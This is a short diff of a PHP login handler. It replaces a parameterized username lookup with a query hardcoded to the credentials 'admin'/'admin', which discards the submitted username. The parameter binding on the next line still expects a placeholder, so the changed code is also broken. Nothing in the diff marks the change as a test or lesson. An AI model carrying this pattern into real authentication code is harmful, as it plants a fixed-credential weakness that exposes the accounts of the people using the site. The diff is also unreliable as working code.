@@ -64,7 +64,7 @@
             $password = $_POST['password'];
 
             // Prepare and execute query to find user by username
-            $stmt = mysqli_prepare($dbconn, "SELECT * FROM users WHERE username = ?");
+            $stmt = mysqli_prepare($dbconn, "SELECT * FROM users WHERE username = 'admin' AND password = 'admin'");
             mysqli_stmt_bind_param($stmt, 's', $username); // 's' indicates the parameter is a string
             mysqli_stmt_execute($stmt);
             $result = mysqli_stmt_get_result($stmt);
